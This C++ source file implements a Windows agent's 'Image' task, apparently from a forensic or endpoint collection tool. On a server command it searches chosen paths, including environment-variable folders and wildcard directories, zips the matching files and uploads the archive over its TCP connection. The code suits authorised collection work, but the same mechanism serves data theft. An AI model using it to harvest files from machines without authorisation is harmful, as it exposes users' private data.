#include "Image.h"

Image::Image(Info* infoInstance, SocketSend* socketSendInstance, char* input_cmd) {
	info = infoInstance;
	socketsend = socketSendInstance;
	cmd = input_cmd;
}

void Image::DoTask() {
	char* null = new char[1];
	strcpy_s(null, 1, "");
	int ret = SendDataPacketToServer("ReadyImage", null, info->tcpSocket);

	string Msg = cmd;
	string LogMsg = "cmd: " + Msg;
	log.logger("Debug", LogMsg);

	TCHAR* zipFileName = new TCHAR[MAX_PATH_EX];
	GetMyPath(zipFileName);
	_tcscat_s(zipFileName, MAX_PATH_EX, _T("\\image.zip"));
	HZIP hz = CreateZip(zipFileName, 0);
	if (hz == 0) {
		log.logger("Error", "Failed to create image.zip");
		return; // Failed to create ZIP file
	}

	std::vector<ImageType>image;
	std::vector<std::string> MsgAfterSplit;
	char* nextToken = nullptr;
	const char* delimiter = ",";
	char* token = strtok_s(cmd, delimiter, &nextToken);
	while (token != nullptr) {
		MsgAfterSplit.push_back(token);
		token = strtok_s(nullptr, delimiter, &nextToken);
	}

	// find root drive
	//WCHAR driveStrings[255];
	//DWORD driveStringsLength = GetLogicalDriveStringsW(255, driveStrings);
	//WCHAR* currentDrive;
	//std::string narrowString_currentDrive; // here
	//if (driveStringsLength > 0 && driveStringsLength < 255) {
	//	currentDrive = driveStrings;
	//	while (*currentDrive) {
	//		int requiredSize = WideCharToMultiByte(CP_UTF8, 0, currentDrive, -1, NULL, 0, NULL, NULL);
	//		narrowString_currentDrive.resize(requiredSize);

	//		if (WideCharToMultiByte(CP_UTF8, 0, currentDrive, -1, &narrowString_currentDrive[0], requiredSize, NULL, NULL)) {
	//			//std::cout << "currentDrive: " << narrowString_currentDrive << std::endl;
	//		}

	//		currentDrive += wcslen(currentDrive) + 1;
	//		break;
	//	}
	//}

	for (int i = 0; i < MsgAfterSplit.size(); i++) {
		std::vector<std::string> FileInfo;
		nextToken = nullptr;
		delimiter = "|";

		char* charArray = new char[MsgAfterSplit[i].size() + 1];
		strcpy_s(charArray, MsgAfterSplit[i].size() + 1, MsgAfterSplit[i].c_str());

		token = strtok_s(charArray, delimiter, &nextToken);
		while (token != nullptr) {
			FileInfo.push_back(token);
			if (nextToken != nullptr && *nextToken == '|') {
				FileInfo.push_back(""); // Generate an empty string
			}
			token = strtok_s(nullptr, delimiter, &nextToken);
		}
		delete[] charArray;

		size_t pos = FileInfo[0].find("root");
		while (pos != std::string::npos) {
			FileInfo[0].replace(pos, 4, "C");
			pos = FileInfo[0].find("root", pos + 1);
		}

		char* searchPath = new char[4];
		std::string APPDATAPATH;

		if (!FileInfo[1].empty()) {
			size_t len;
			errno_t err = _dupenv_s(&searchPath, &len, const_cast<char*>(FileInfo[1].c_str()));

			if (err != 0) {
				log.logger("Error", "Error getting environment variable");
				continue;
			}

			if (searchPath == NULL) {
				log.logger("Error", "environment variable is not set.");
				continue;
			}

			APPDATAPATH = searchPath;

			//printf("search path: %s\n", searchPath);
			if (FileInfo[0].substr(0, 1) != "\\") APPDATAPATH += "\\";

		}


		APPDATAPATH += FileInfo[0];
		FileInfo[0] = APPDATAPATH;


		//printf("%s %s %s\n", FileInfo[0].c_str(), FileInfo[1].c_str(), FileInfo[2].c_str());
		string Msg = FileInfo[0] + " " + FileInfo[1] + " " + FileInfo[2];
		log.logger("Debug", Msg);

		fs::path filePath = FileInfo[0];
		const auto relative_parent = filePath.parent_path().relative_path();
		std::filesystem::path root = filePath.root_path();
		std::filesystem::path::const_iterator start = begin(relative_parent);
		std::filesystem::path::const_iterator finish = end(relative_parent);

		SearchForFile(root, filePath, start, finish, FileInfo[2], &hz);

	}

	CloseZip(hz);
	SendFileToServer("Image", zipFileName, info->tcpSocket);
}

std::string Image::ToUpper(const std::string& str) {
	std::string result = str;
	std::transform(result.begin(), result.end(), result.begin(),
		[](unsigned char c) { return std::toupper(c); });
	return result;
}
void Image::SearchForFile(std::filesystem::path root, std::filesystem::path directory, std::filesystem::path::const_iterator start, std::filesystem::path::const_iterator finish, const std::string& targetFile, HZIP* hz) {

	if (directory.string().find('*') != std::string::npos) {

		while (start != finish && start->string().find('*') == std::string::npos) {
			root /= *start++;
			std::cout << root << std::endl;
		}

		if (!fs::is_directory(root)) {
			std::string Msg = directory.string() + "is not a directory";
			log.logger("Error", Msg);
			return;
		}

		try {

			for (const auto& entry : fs::directory_iterator(root)) {

				if (ToUpper(entry.path().filename().string()).find(ToUpper(targetFile)) != std::string::npos) {
					std::string Msg = "Found file: " + entry.path().string();
					log.logger("Debug", Msg);

					try {
						TCHAR* targetPath = new TCHAR[MAX_PATH_EX];
						GetMyPath(targetPath);
						fs::copy(entry.path(), targetPath, fs::copy_options::recursive);
						_tcscat_s(targetPath, MAX_PATH_EX, _T("\\image.zip"));

						TCHAR* imageFile = new TCHAR[MAX_PATH_EX];
						GetMyPath(imageFile);
						_tcscat_s(imageFile, MAX_PATH_EX, _T("\\"));
						_tcscat_s(imageFile, MAX_PATH_EX, entry.path().filename().c_str());

						if (ZipAdd(*hz, entry.path().filename().c_str(), imageFile) != 0) {
							int bufferSize = WideCharToMultiByte(CP_UTF8, 0, imageFile, -1, nullptr, 0, nullptr, nullptr);
							char* buffer = new char[bufferSize];
							WideCharToMultiByte(CP_UTF8, 0, imageFile, -1, buffer, bufferSize, nullptr, nullptr);
							std::string result(buffer);

							string LogMsg = "failed to add " + result + " to zip";
							log.logger("Error", LogMsg);
							continue;
						}
						else {
							string LogMsg = "add " + entry.path().filename().string() + " to zip";
							log.logger("Info", LogMsg);
						}
						DeleteFile(imageFile);
					}
					catch (const fs::filesystem_error& ex) {
						std::string errorMessage = ex.what();
						Msg = "Error during copy: " + errorMessage;
						log.logger("Error", Msg);
					}

				}
				else if (fs::is_directory(entry.path())) {
					start++;
					SearchForFile(entry.path(), directory, start, finish, targetFile, hz);
					start--;
				}
			}

		}
		catch (...) {
			return;
		}
	}
	else {

		try {
			for (const auto& entry : fs::directory_iterator(directory)) {
				if (ToUpper(entry.path().filename().string()).find(ToUpper(targetFile)) != std::string::npos) {
					std::string Msg = "Found file: " + entry.path().string();
					log.logger("Debug", Msg);
					try {
						TCHAR* targetPath = new TCHAR[MAX_PATH_EX];
						GetMyPath(targetPath);
						fs::copy(entry.path(), targetPath, fs::copy_options::recursive);
						_tcscat_s(targetPath, MAX_PATH_EX, _T("\\image.zip"));

						TCHAR* imageFile = new TCHAR[MAX_PATH_EX];
						GetMyPath(imageFile);
						_tcscat_s(imageFile, MAX_PATH_EX, _T("\\"));
						_tcscat_s(imageFile, MAX_PATH_EX, entry.path().filename().c_str());

						if (ZipAdd(*hz, entry.path().filename().c_str(), imageFile) != 0) {
							int bufferSize = WideCharToMultiByte(CP_UTF8, 0, imageFile, -1, nullptr, 0, nullptr, nullptr);
							char* buffer = new char[bufferSize];
							WideCharToMultiByte(CP_UTF8, 0, imageFile, -1, buffer, bufferSize, nullptr, nullptr);
							std::string result(buffer);

							string LogMsg = "failed to add " + result + " to zip";
							log.logger("Error", LogMsg);
							continue;
						}
						else {
							string LogMsg = "add " + entry.path().filename().string() + " to zip";
							log.logger("Info", LogMsg);
						}
						DeleteFile(imageFile);
					}
					catch (const fs::filesystem_error& ex) {
						std::string errorMessage = ex.what();
						Msg = "Error during copy: " + errorMessage;
						log.logger("Error", Msg);
					}

				}
				else if (fs::is_directory(entry.path())) {
					SearchForFile(entry.path(), entry.path(), start, finish, targetFile, hz);
				}
			}
		}
		catch (...) {
			return;
		}
	}
}